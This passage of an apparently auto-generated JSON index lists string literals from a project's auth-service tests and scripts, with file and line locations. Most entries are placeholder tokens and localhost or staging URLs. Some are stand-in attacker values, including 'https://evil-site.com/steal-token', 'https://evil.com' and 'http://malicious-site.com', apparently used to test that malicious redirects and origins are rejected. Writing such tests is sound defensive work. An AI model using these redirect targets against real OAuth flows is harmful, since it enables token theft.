        "auth_service/tests/test_auth_database_manager_missing_method.py:34",
        "auth_service/tests/test_auth_database_manager_missing_method.py:353",
        "auth_service/tests/test_critical_staging_issues.py:37",
        "auth_service/tests/test_critical_staging_issues.py:41",
        "auth_service/tests/test_critical_staging_issues.py:63",
        "auth_service/tests/test_critical_staging_issues.py:85"
      ]
    },
    "get_auth_database_url_async must be callable": {
      "value": "get_auth_database_url_async must be callable",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/test_auth_database_manager_missing_method.py:35"
      ]
    },
    "get_auth_database_url_async should be callable": {
      "value": "get_auth_database_url_async should be callable",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/test_auth_database_manager_missing_method.py:357",
        "auth_service/tests/test_critical_staging_issues.py:42"
      ]
    },
    "get_auth_database_url_async should return string": {
      "value": "get_auth_database_url_async should return string",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/test_auth_database_manager_missing_method.py:289"
      ]
    },
    "get_database_url": {
      "value": "get_database_url",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/test_database_authentication_failures.py:123",
        "auth_service/tests/test_database_authentication_failures.py:158",
        "auth_service/tests/test_database_authentication_failures.py:268",
        "auth_service/tests/test_database_authentication_failures.py:383",
        "auth_service/tests/test_database_connection_validation.py:55",
        "auth_service/tests/test_database_connection_validation.py:92",
        "auth_service/tests/test_database_connection_validation.py:167",
        "auth_service/tests/test_database_connection_validation.py:279",
        "scripts/test_auth_database_sessions.py:43"
      ]
    },
    "get_google_client_id": {
      "value": "get_google_client_id",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/test_critical_oauth_environment_failures.py:392"
      ]
    },
    "get_google_client_secret": {
      "value": "get_google_client_secret",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/test_critical_oauth_environment_failures.py:393"
      ]
    },
    "get_jwt_secret": {
      "value": "get_jwt_secret",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/test_critical_oauth_environment_failures.py:394"
      ]
    },
    "git": {
      "value": "git",
      "category": "test_literals",
      "locations": [
        "scripts/compliance/real_test_linter.py:228",
        "scripts/standardize_l3_test_names.py:133"
      ]
    },
    "github": {
      "value": "github",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/base/test_mixins.py:225",
        "auth_service/tests/integration/test_oauth_flows_sync.py:127",
        "auth_service/tests/test_setup.py:34",
        "auth_service/tests/unit/test_oauth_models.py:29",
        "auth_service/tests/utils/assertion_helpers.py:104"
      ]
    },
    "github_access_": {
      "value": "github_access_",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/factories/token_factory.py:218"
      ]
    },
    "github_access_token_123": {
      "value": "github_access_token_123",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/integration/test_oauth_flows_fixtures.py:36"
      ]
    },
    "github_refresh_token_123": {
      "value": "github_refresh_token_123",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/integration/test_oauth_flows_fixtures.py:37"
      ]
    },
    "given_name": {
      "value": "given_name",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/test_oauth_id_token_validation.py:46"
      ]
    },
    "good": {
      "value": "good",
      "category": "test_literals",
      "locations": [
        "frontend/components/chat/ConnectionStatusIndicator.test.tsx:45"
      ]
    },
    "google": {
      "value": "google",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/base/test_mixins.py:213",
        "auth_service/tests/base/test_mixins.py:220",
        "auth_service/tests/conftest.py:159",
        "auth_service/tests/integration/test_auth_oauth_google.py:400",
        "auth_service/tests/integration/test_auth_oauth_google.py:404",
        "auth_service/tests/integration/test_oauth_flows_sync.py:126",
        "auth_service/tests/test_setup.py:33",
        "auth_service/tests/unit/test_oauth_models.py:28",
        "auth_service/tests/utils/assertion_helpers.py:104",
        "auth_service/tests/utils/test_helpers.py:60"
      ]
    },
    "google_123456": {
      "value": "google_123456",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/integration/test_oauth_comprehensive_failures.py:120"
      ]
    },
    "google_access_": {
      "value": "google_access_",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/factories/token_factory.py:193"
      ]
    },
    "google_access_token_123": {
      "value": "google_access_token_123",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/integration/test_auth_oauth_errors.py:45",
        "auth_service/tests/integration/test_auth_oauth_google.py:54",
        "auth_service/tests/integration/test_oauth_flows_fixtures.py:26"
      ]
    },
    "google_client_123": {
      "value": "google_client_123",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/unit/test_oauth_models.py:185",
        "auth_service/tests/unit/test_oauth_models.py:192"
      ]
    },
    "google_client_id": {
      "value": "google_client_id",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/integration/test_oauth_flows_auth.py:35",
        "auth_service/tests/integration/test_oauth_flows_core.py:46",
        "auth_service/tests/integration/test_oauth_flows_sync.py:31",
        "auth_service/tests/utils/test_client.py:191"
      ]
    },
    "google_id_token_123": {
      "value": "google_id_token_123",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/integration/test_auth_oauth_errors.py:47",
        "auth_service/tests/integration/test_auth_oauth_google.py:56",
        "auth_service/tests/integration/test_oauth_flows_fixtures.py:28"
      ]
    },
    "google_refresh_": {
      "value": "google_refresh_",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/factories/token_factory.py:194"
      ]
    },
    "google_refresh_token_123": {
      "value": "google_refresh_token_123",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/integration/test_auth_oauth_errors.py:46",
        "auth_service/tests/integration/test_auth_oauth_google.py:55",
        "auth_service/tests/integration/test_oauth_flows_fixtures.py:27"
      ]
    },
    "google_test_user_123": {
      "value": "google_test_user_123",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/integration/test_auth_oauth_google.py:46"
      ]
    },
    "google_user_1": {
      "value": "google_user_1",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/integration/test_auth_oauth_google.py:247"
      ]
    },
    "google_user_2": {
      "value": "google_user_2",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/integration/test_auth_oauth_google.py:255"
      ]
    },
    "google_user_3": {
      "value": "google_user_3",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/integration/test_auth_oauth_google.py:262"
      ]
    },
    "gpt-3.5-turbo": {
      "value": "gpt-3.5-turbo",
      "category": "test_literals",
      "locations": [
        "scripts/real_service_test_metrics.py:33"
      ]
    },
    "gpt-4": {
      "value": "gpt-4",
      "category": "test_literals",
      "locations": [
        "netra_backend/app/services/realistic_test_data/models.py:31",
        "netra_backend/app/services/realistic_test_data/models.py:142",
        "scripts/real_service_test_metrics.py:34"
      ]
    },
    "gpt-4-turbo": {
      "value": "gpt-4-turbo",
      "category": "test_literals",
      "locations": [
        "netra_backend/app/services/realistic_test_data/models.py:41"
      ]
    },
    "graceful_degradation": {
      "value": "graceful_degradation",
      "category": "test_literals",
      "locations": [
        "scripts/test_coordination_fixes.py:46"
      ]
    },
    "graceful_degradation      → test_10_graceful_degradation_optional_services": {
      "value": "graceful_degradation      → test_10_graceful_degradation_optional_services",
      "category": "test_literals",
      "locations": [
        "scripts/test_coordination_fixes.py:396"
      ]
    },
    "gradual_increase": {
      "value": "gradual_increase",
      "category": "test_literals",
      "locations": [
        "netra_backend/app/services/realistic_test_data/models.py:88"
      ]
    },
    "grant_method": {
      "value": "grant_method",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/factories/audit_factory.py:214"
      ]
    },
    "granted_at": {
      "value": "granted_at",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/factories/permission_factory.py:60"
      ]
    },
    "granted_by": {
      "value": "granted_by",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/factories/audit_factory.py:213",
        "auth_service/tests/factories/permission_factory.py:61"
      ]
    },
    "green": {
      "value": "green",
      "category": "test_literals",
      "locations": [
        "scripts/test_oauth_local.py:156"
      ]
    },
    "guessed_secret": {
      "value": "guessed_secret",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/integration/test_oauth_comprehensive_failures.py:1121"
      ]
    },
    "hacker-user": {
      "value": "hacker-user",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/test_auth_token_security.py:213"
      ]
    },
    "hacker-user-999": {
      "value": "hacker-user-999",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/test_auth_token_security.py:165"
      ]
    },
    "hacker@evil.com": {
      "value": "hacker@evil.com",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/test_auth_token_security.py:214"
      ]
    },
    "handler": {
      "value": "handler",
      "category": "test_literals",
      "locations": [
        "scripts/auto_fix_test_sizes.py:369"
      ]
    },
    "handlers": {
      "value": "handlers",
      "category": "test_literals",
      "locations": [
        "scripts/auto_fix_test_sizes.py:370"
      ]
    },
    "hardcoded_test_data": {
      "value": "hardcoded_test_data",
      "category": "test_literals",
      "locations": [
        "scripts/remove_test_stubs.py:55",
        "scripts/remove_test_stubs.py:165",
        "scripts/remove_test_stubs.py:174"
      ]
    },
    "hardcoded_wait": {
      "value": "hardcoded_wait",
      "category": "test_literals",
      "locations": [
        "scripts/autonomous_review/test_reviewer.py:165",
        "scripts/autonomous_review/test_reviewer.py:179",
        "scripts/autonomous_review/test_reviewer.py:181"
      ]
    },
    "harness.py": {
      "value": "harness.py",
      "category": "test_literals",
      "locations": [
        "scripts/compliance/project_test_validator.py:113"
      ]
    },
    "has": {
      "value": "has",
      "category": "test_literals",
      "locations": [
        "scripts/auto_fix_test_violations.py:610"
      ]
    },
    "has failing tests!": {
      "value": "has failing tests!",
      "category": "test_literals",
      "locations": [
        "scripts/auto_fix_test_violations.py:838"
      ]
    },
    "has no attribute 'get_auth_database_url_async'": {
      "value": "has no attribute 'get_auth_database_url_async'",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/test_critical_staging_issues.py:93"
      ]
    },
    "has no end-to-end tests": {
      "value": "has no end-to-end tests",
      "category": "test_literals",
      "locations": [
        "scripts/business_value_test_index.py:671"
      ]
    },
    "has only": {
      "value": "has only",
      "category": "test_literals",
      "locations": [
        "scripts/business_value_test_index.py:663"
      ]
    },
    "has_cloud_sql": {
      "value": "has_cloud_sql",
      "category": "test_literals",
      "locations": [
        "scripts/test_staging_db_direct.py:80"
      ]
    },
    "has_docstring": {
      "value": "has_docstring",
      "category": "test_literals",
      "locations": [
        "scripts/compliance/test_size_validator.py:314"
      ]
    },
    "has_return": {
      "value": "has_return",
      "category": "test_literals",
      "locations": [
        "scripts/autonomous_review/test_generator.py:156"
      ]
    },
    "has_ssl": {
      "value": "has_ssl",
      "category": "test_literals",
      "locations": [
        "scripts/test_staging_db_direct.py:82"
      ]
    },
    "hashed_password": {
      "value": "hashed_password",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/base/test_mixins.py:176",
        "auth_service/tests/factories/user_factory.py:62",
        "auth_service/tests/factories/user_factory.py:83"
      ]
    },
    "header.payload": {
      "value": "header.payload",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/test_security.py:587"
      ]
    },
    "header.payload.signature.extra": {
      "value": "header.payload.signature.extra",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/test_security.py:588"
      ]
    },
    "headers": {
      "value": "headers",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/utils/assertion_helpers.py:237"
      ]
    },
    "health": {
      "value": "health",
      "category": "test_literals",
      "locations": [
        "scripts/remove_test_stubs.py:168"
      ]
    },
    "health:test": {
      "value": "health:test",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/integration/test_redis_connection_failover.py:280"
      ]
    },
    "health_endpoint": {
      "value": "health_endpoint",
      "category": "test_literals",
      "locations": [
        "scripts/test_websocket_dev_mode.py:39",
        "scripts/test_websocket_dev_mode.py:129"
      ]
    },
    "health_password": {
      "value": "health_password",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/test_database_connection_validation.py:122"
      ]
    },
    "health_status": {
      "value": "health_status",
      "category": "test_literals",
      "locations": [
        "netra_backend/app/services/realistic_test_data/performance_simulator.py:126"
      ]
    },
    "health_user": {
      "value": "health_user",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/test_database_connection_validation.py:121",
        "auth_service/tests/test_database_connection_validation.py:134"
      ]
    },
    "healthcare": {
      "value": "healthcare",
      "category": "test_literals",
      "locations": [
        "netra_backend/app/services/realistic_test_data/workload_simulator.py:25",
        "netra_backend/app/services/realistic_test_data/workload_simulator.py:256"
      ]
    },
    "healthy": {
      "value": "healthy",
      "category": "test_literals",
      "locations": [
        "netra_backend/app/agents/test_agent_initialization.py:45",
        "netra_backend/app/agents/test_agent_initialization.py:161",
        "netra_backend/app/services/realistic_test_data/performance_simulator.py:229",
        "auth_service/tests/integration/test_redis_connection_failover.py:60",
        "auth_service/tests/test_auth_startup_integration.py:128",
        "scripts/team_updates_test_analyzer.py:94",
        "scripts/test_oauth_local.py:108",
        "scripts/test_oauth_local.py:115",
        "scripts/test_oauth_local.py:123",
        "scripts/test_oauth_local.py:130"
      ]
    },
    "heap size": {
      "value": "heap size",
      "category": "test_literals",
      "locations": [
        "netra_backend/app/services/realistic_test_data/models.py:89"
      ]
    },
    "help_display": {
      "value": "help_display",
      "category": "test_literals",
      "locations": [
        "scripts/test_verify_workflow_status.py:79",
        "scripts/test_verify_workflow_status_corrected.py:86"
      ]
    },
    "helper": {
      "value": "helper",
      "category": "test_literals",
      "locations": [
        "scripts/auto_fix_test_violations.py:447",
        "scripts/auto_fix_test_violations.py:509",
        "scripts/compliance/test_refactor_helper.py:207",
        "scripts/compliance/test_refactor_helper.py:429",
        "scripts/compliance/test_refactor_helper.py:563"
      ]
    },
    "helpers)": {
      "value": "helpers)",
      "category": "test_literals",
      "locations": [
        "scripts/compliance/test_size_validator.py:383"
      ]
    },
    "helpers.py": {
      "value": "helpers.py",
      "category": "test_literals",
      "locations": [
        "scripts/compliance/project_test_validator.py:112",
        "scripts/compliance/real_test_requirements_enforcer.py:140",
        "scripts/compliance/real_test_validator.py:69"
      ]
    },
    "high": {
      "value": "high",
      "category": "test_literals",
      "locations": [
        "netra_backend/app/services/realistic_test_data/performance_simulator.py:335",
        "netra_backend/app/services/realistic_test_data/performance_simulator.py:483",
        "netra_backend/app/services/realistic_test_data/performance_simulator.py:490",
        "scripts/business_value_test_index.py:662",
        "scripts/business_value_test_index.py:670",
        "scripts/business_value_test_index.py:680",
        "scripts/business_value_test_index.py:760",
        "scripts/compliance/fake_test_scanner.py:159",
        "scripts/compliance/fake_test_scanner.py:200",
        "scripts/compliance/fake_test_scanner.py:202"
      ]
    },
    "high failure rate tests": {
      "value": "high failure rate tests",
      "category": "test_literals",
      "locations": [
        "scripts/compliance/fake_test_scanner.py:334"
      ]
    },
    "high_error_rate": {
      "value": "high_error_rate",
      "category": "test_literals",
      "locations": [
        "netra_backend/app/services/realistic_test_data/performance_simulator.py:356"
      ]
    },
    "high_failure_rate": {
      "value": "high_failure_rate",
      "category": "test_literals",
      "locations": [
        "scripts/compliance/fake_test_scanner.py:297",
        "scripts/compliance/fake_test_scanner.py:332",
        "scripts/compliance/fake_test_scanner.py:334"
      ]
    },
    "high_latency": {
      "value": "high_latency",
      "category": "test_literals",
      "locations": [
        "netra_backend/app/services/realistic_test_data/performance_simulator.py:350"
      ]
    },
    "high_load": {
      "value": "high_load",
      "category": "test_literals",
      "locations": [
        "netra_backend/app/services/realistic_test_data/performance_simulator.py:24",
        "netra_backend/app/services/realistic_test_data/performance_simulator.py:163"
      ]
    },
    "high_value_test_count": {
      "value": "high_value_test_count",
      "category": "test_literals",
      "locations": [
        "scripts/business_value_test_index.py:633"
      ]
    },
    "highlight": {
      "value": "highlight",
      "category": "test_literals",
      "locations": [
        "scripts/test_discovery_report.py:92"
      ]
    },
    "highly similar test pairs. Consider refactoring these using parametrized tests or test utilities.": {
      "value": "highly similar test pairs. Consider refactoring these using parametrized tests or test utilities.",
      "category": "test_literals",
      "locations": [
        "scripts/analyze_test_overlap.py:451"
      ]
    },
    "highly_similar": {
      "value": "highly_similar",
      "category": "test_literals",
      "locations": [
        "scripts/analyze_test_overlap.py:66",
        "scripts/analyze_test_overlap.py:325",
        "scripts/analyze_test_overlap.py:358",
        "scripts/analyze_test_overlap.py:352",
        "scripts/analyze_test_overlap.py:381",
        "scripts/analyze_test_overlap.py:382",
        "scripts/analyze_test_overlap.py:412",
        "scripts/analyze_test_overlap.py:412",
        "scripts/analyze_test_overlap.py:449",
        "scripts/analyze_test_overlap.py:451"
      ]
    },
    "history": {
      "value": "history",
      "category": "test_literals",
      "locations": [
        "scripts/test_staging_migrations.py:247"
      ]
    },
    "hit_rate": {
      "value": "hit_rate",
      "category": "test_literals",
      "locations": [
        "scripts/real_service_test_metrics.py:24",
        "scripts/real_service_test_metrics.py:64",
        "scripts/real_service_test_metrics.py:175"
      ]
    },
    "hits": {
      "value": "hits",
      "category": "test_literals",
      "locations": [
        "scripts/real_service_test_metrics.py:24",
        "scripts/real_service_test_metrics.py:58",
        "scripts/real_service_test_metrics.py:62",
        "scripts/real_service_test_metrics.py:64",
        "scripts/real_service_test_metrics.py:168",
        "scripts/real_service_test_metrics.py:173"
      ]
    },
    "hmac-secret": {
      "value": "hmac-secret",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/test_critical_oauth_environment_failures.py:305",
        "auth_service/tests/test_critical_oauth_environment_failures.py:327"
      ]
    },
    "hmac_test_code_": {
      "value": "hmac_test_code_",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/integration/test_oauth_comprehensive_failures.py:372"
      ]
    },
    "holiday_season": {
      "value": "holiday_season",
      "category": "test_literals",
      "locations": [
        "netra_backend/app/services/realistic_test_data/workload_simulator.py:29",
        "netra_backend/app/services/realistic_test_data/workload_simulator.py:142"
      ]
    },
    "hooks": {
      "value": "hooks",
      "category": "test_literals",
      "locations": [
        "scripts/test_frontend.py:32"
      ]
    },
    "host": {
      "value": "host",
      "category": "test_literals",
      "locations": [
        "auth_service/test_staging_db_connection.py:55",
        "auth_service/test_staging_db_connection.py:92",
        "scripts/test_ssl_certificates_staging.py:110",
        "scripts/test_ssl_certificates_staging.py:115",
        "scripts/test_ssl_certificates_staging.py:126"
      ]
    },
    "host.com:5432": {
      "value": "host.com:5432",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/test_cloud_sql_url.py:116"
      ]
    },
    "hour_of_day": {
      "value": "hour_of_day",
      "category": "test_literals",
      "locations": [
        "netra_backend/app/services/realistic_test_data/workload_simulator.py:123"
      ]
    },
    "hs256": {
      "value": "hs256",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/unit/test_oauth_jwt_security_validator.py:134"
      ]
    },
    "html": {
      "value": "html",
      "category": "test_literals",
      "locations": [
        "scripts/business_value_test_index.py:777",
        "scripts/real_service_test_metrics.py:115"
      ]
    },
    "htmlcov": {
      "value": "htmlcov",
      "category": "test_literals",
      "locations": [
        "scripts/business_value_test_index.py:133",
        "scripts/generate_test_audit.py:26",
        "scripts/remove_test_stubs.py:80"
      ]
    },
    "http": {
      "value": "http",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/test_security.py:33"
      ]
    },
    "http://": {
      "value": "http://",
      "category": "test_literals",
      "locations": [
        "scripts/test_cold_start_e2e.py:457"
      ]
    },
    "http://localhost": {
      "value": "http://localhost",
      "category": "test_literals",
      "locations": [
        "scripts/test_staging_env.py:21",
        "scripts/test_staging_env.py:209"
      ]
    },
    "http://localhost:": {
      "value": "http://localhost:",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/test_auth_startup_integration.py:94",
        "auth_service/tests/test_auth_startup_integration.py:113",
        "auth_service/tests/test_auth_startup_integration.py:143",
        "auth_service/tests/test_auth_startup_integration.py:154",
        "scripts/test_coordination_fixes.py:306",
        "scripts/test_coordination_fixes.py:318",
        "scripts/test_frontend.py:256",
        "scripts/test_frontend.py:270"
      ]
    },
    "http://localhost:18001": {
      "value": "http://localhost:18001",
      "category": "test_literals",
      "locations": [
        "scripts/test_coordination_fixes.py:209"
      ]
    },
    "http://localhost:3000": {
      "value": "http://localhost:3000",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/config/test_env.py:45",
        "auth_service/tests/config/test_settings.py:65",
        "auth_service/tests/config/test_settings.py:68",
        "auth_service/tests/unit/test_oauth_models.py:212",
        "scripts/test_auth_integration.py:108",
        "scripts/test_backend.py:93",
        "scripts/test_staging_env.py:105",
        "scripts/test_websocket_dev_mode.py:150",
        "scripts/test_websocket_dev_mode.py:176"
      ]
    },
    "http://localhost:3000,http://localhost:3001": {
      "value": "http://localhost:3000,http://localhost:3001",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/config/test_env.py:54"
      ]
    },
    "http://localhost:3000/auth/callback": {
      "value": "http://localhost:3000/auth/callback",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/unit/test_oauth_models.py:202",
        "auth_service/tests/unit/test_oauth_models.py:213"
      ]
    },
    "http://localhost:3001": {
      "value": "http://localhost:3001",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/config/test_settings.py:68"
      ]
    },
    "http://localhost:8000": {
      "value": "http://localhost:8000",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/config/test_env.py:46",
        "auth_service/tests/config/test_settings.py:66",
        "scripts/start_test_services.py:153",
        "scripts/test_auth_integration.py:21",
        "scripts/test_auth_integration.py:175",
        "scripts/test_oauth_local.py:41",
        "scripts/test_websocket_dev_mode.py:34",
        "scripts/unified_test_config.py:131",
        "scripts/unified_test_runner.py:183"
      ]
    },
    "http://localhost:8000/health": {
      "value": "http://localhost:8000/health",
      "category": "test_literals",
      "locations": [
        "scripts/start_test_services.py:117"
      ]
    },
    "http://localhost:8080": {
      "value": "http://localhost:8080",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/auth-service-down-critical-scenarios.py:62"
      ]
    },
    "http://localhost:8081": {
      "value": "http://localhost:8081",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/config/test_env.py:44",
        "auth_service/tests/config/test_settings.py:64",
        "scripts/start_test_services.py:154",
        "scripts/test_auth_integration.py:20",
        "scripts/test_auth_integration.py:170",
        "scripts/test_oauth_local.py:42",
        "scripts/unified_test_runner.py:184"
      ]
    },
    "http://localhost:8081/auth/callback": {
      "value": "http://localhost:8081/auth/callback",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/config/test_env.py:206",
        "auth_service/tests/config/test_settings.py:57"
      ]
    },
    "http://localhost:8081/auth/dev/login": {
      "value": "http://localhost:8081/auth/dev/login",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/unit/test_oauth_models.py:205"
      ]
    },
    "http://localhost:8081/auth/login": {
      "value": "http://localhost:8081/auth/login",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/unit/test_oauth_models.py:200"
      ]
    },
    "http://localhost:8081/auth/logout": {
      "value": "http://localhost:8081/auth/logout",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/unit/test_oauth_models.py:201"
      ]
    },
    "http://localhost:8081/auth/token": {
      "value": "http://localhost:8081/auth/token",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/unit/test_oauth_models.py:203"
      ]
    },
    "http://localhost:8081/auth/verify": {
      "value": "http://localhost:8081/auth/verify",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/unit/test_oauth_models.py:204"
      ]
    },
    "http://localhost:8081/health": {
      "value": "http://localhost:8081/health",
      "category": "test_literals",
      "locations": [
        "scripts/start_test_services.py:123"
      ]
    },
    "http://localhost:8083": {
      "value": "http://localhost:8083",
      "category": "test_literals",
      "locations": [
        "scripts/test_cold_start_e2e.py:441"
      ]
    },
    "http://malicious-site.com": {
      "value": "http://malicious-site.com",
      "category": "test_literals",
      "locations": [
        "scripts/test_websocket_dev_mode.py:156"
      ]
    },
    "http_client": {
      "value": "http_client",
      "category": "test_literals",
      "locations": [
        "scripts/analyze_test_mocks.py:21",
        "scripts/analyze_test_mocks.py:57"
      ]
    },
    "https://": {
      "value": "https://",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/test_critical_oauth_environment_failures.py:351",
        "auth_service/tests/test_critical_oauth_environment_failures.py:362",
        "auth_service/tests/unit/test_oauth_models.py:149",
        "auth_service/tests/unit/test_oauth_models.py:150",
        "auth_service/tests/unit/test_oauth_models.py:151",
        "auth_service/tests/unit/test_oauth_models.py:152",
        "auth_service/tests/unit/test_oauth_models.py:153"
      ]
    },
    "https://accounts.google.com": {
      "value": "https://accounts.google.com",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/factories/token_factory.py:201",
        "auth_service/tests/integration/test_oauth_comprehensive_failures.py:1488",
        "auth_service/tests/test_oauth_id_token_validation.py:40",
        "auth_service/tests/test_oauth_id_token_validation.py:67",
        "auth_service/tests/test_oauth_id_token_validation.py:72",
        "auth_service/tests/test_oauth_id_token_validation.py:100",
        "auth_service/tests/test_oauth_id_token_validation.py:159",
        "auth_service/tests/test_oauth_id_token_validation.py:187",
        "auth_service/tests/unit/test_oauth_jwt_security_validator.py:229"
      ]
    },
    "https://api.netra.systems": {
      "value": "https://api.netra.systems",
      "category": "test_literals",
      "locations": [
        "scripts/unified_test_config.py:155"
      ]
    },
    "https://api.staging.netra.ai": {
      "value": "https://api.staging.netra.ai",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/integration/test_oauth_comprehensive_failures.py:104"
      ]
    },
    "https://api.staging.netrasystems.ai": {
      "value": "https://api.staging.netrasystems.ai",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/test_critical_staging_issues.py:255",
        "scripts/test_staging.py:24",
        "scripts/test_staging.py:28",
        "scripts/test_staging_deployment.py:20"
      ]
    },
    "https://app.example.com": {
      "value": "https://app.example.com",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/unit/test_oauth_models.py:188"
      ]
    },
    "https://app.example.com/auth/callback": {
      "value": "https://app.example.com/auth/callback",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/unit/test_oauth_models.py:144",
        "auth_service/tests/unit/test_oauth_models.py:160",
        "auth_service/tests/unit/test_oauth_models.py:179",
        "auth_service/tests/unit/test_oauth_models.py:189"
      ]
    },
    "https://app.staging.netra.ai": {
      "value": "https://app.staging.netra.ai",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/integration/test_oauth_comprehensive_failures.py:105"
      ]
    },
    "https://app.staging.netrasystems.ai": {
      "value": "https://app.staging.netrasystems.ai",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/test_critical_staging_issues.py:239",
        "auth_service/tests/test_critical_staging_issues.py:253",
        "scripts/test_staging.py:23",
        "scripts/test_staging.py:26",
        "scripts/test_staging.py:27",
        "scripts/test_staging.py:30",
        "scripts/test_staging_deployment.py:22"
      ]
    },
    "https://auth-service.staging.netra.ai": {
      "value": "https://auth-service.staging.netra.ai",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/integration/test_oauth_comprehensive_failures.py:103"
      ]
    },
    "https://auth.example.com/auth/login": {
      "value": "https://auth.example.com/auth/login",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/unit/test_oauth_models.py:142",
        "auth_service/tests/unit/test_oauth_models.py:158",
        "auth_service/tests/unit/test_oauth_models.py:177"
      ]
    },
    "https://auth.example.com/auth/logout": {
      "value": "https://auth.example.com/auth/logout",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/unit/test_oauth_models.py:143",
        "auth_service/tests/unit/test_oauth_models.py:159",
        "auth_service/tests/unit/test_oauth_models.py:178"
      ]
    },
    "https://auth.example.com/auth/token": {
      "value": "https://auth.example.com/auth/token",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/unit/test_oauth_models.py:145",
        "auth_service/tests/unit/test_oauth_models.py:161",
        "auth_service/tests/unit/test_oauth_models.py:180"
      ]
    },
    "https://auth.example.com/auth/verify": {
      "value": "https://auth.example.com/auth/verify",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/unit/test_oauth_models.py:146",
        "auth_service/tests/unit/test_oauth_models.py:162",
        "auth_service/tests/unit/test_oauth_models.py:181"
      ]
    },
    "https://auth.staging.netrasystems.ai": {
      "value": "https://auth.staging.netrasystems.ai",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/test_critical_staging_issues.py:254",
        "scripts/test_staging.py:25",
        "scripts/test_staging.py:29",
        "scripts/test_staging_deployment.py:21"
      ]
    },
    "https://avatars.githubusercontent.com/": {
      "value": "https://avatars.githubusercontent.com/",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/factories/token_factory.py:226"
      ]
    },
    "https://dev.netra.systems": {
      "value": "https://dev.netra.systems",
      "category": "test_literals",
      "locations": [
        "scripts/unified_test_config.py:139"
      ]
    },
    "https://evil-site.com": {
      "value": "https://evil-site.com",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/integration/test_oauth_comprehensive_failures.py:329"
      ]
    },
    "https://evil-site.com/steal-token": {
      "value": "https://evil-site.com/steal-token",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/integration/test_oauth_comprehensive_failures.py:1097"
      ]
    },
    "https://evil.com": {
      "value": "https://evil.com",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/test_security.py:364",
        "auth_service/tests/test_security.py:697"
      ]
    },
    "https://example.com/avatar.jpg": {
      "value": "https://example.com/avatar.jpg",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/integration/test_auth_oauth_google.py:49"
      ]
    },
    "https://example.com/avatar/": {
      "value": "https://example.com/avatar/",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/factories/user_factory.py:87"
      ]
    },
    "https://example.com/john.jpg": {
      "value": "https://example.com/john.jpg",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/integration/test_auth_oauth_google.py:250"
      ]
    },
    "https://example.com/photo.jpg": {
      "value": "https://example.com/photo.jpg",
      "category": "test_literals",
      "locations": [
